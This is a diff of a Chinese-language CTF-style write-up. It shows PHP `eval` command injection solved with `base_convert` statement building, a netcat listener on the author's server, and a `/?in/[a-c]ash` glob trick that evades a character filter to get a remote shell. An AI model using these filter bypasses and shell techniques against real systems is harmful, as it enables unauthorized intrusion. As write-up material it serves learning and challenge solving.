@@ -43,7 +43,7 @@ eval($cmd);
 ?>
 ```
 
-ban了一堆函数，但肯定还有能用的，`<>"`因为`htmlspecialchars`也是不能用的
+ban了一堆函数，但肯定还有能用的，`<、>、"`因为`htmlspecialchars`也是不能用的
 
 往无参数RCE方向走发现不太可行，最后利用`base_convert`构造语句
 
@@ -108,7 +108,7 @@ if(isset($_GET['ip'])){
 
 在我的服务器监听端口，`nc -lvp [port]`
 
-再给1赋予执行权限`chmod 777 1`，需要用bash执行，可是不可以含有`b`，于是利用`b`和`[a-c]`，即执行`/?in/[a-c]ash 1`
+再给1赋予执行权限`chmod 777 1`，需要用bash执行，可是不可以含有`b`，于是利用`?`和`[a-c]`，即执行`/?in/[a-c]ash 1`
 
 我的服务器成功getshell
 
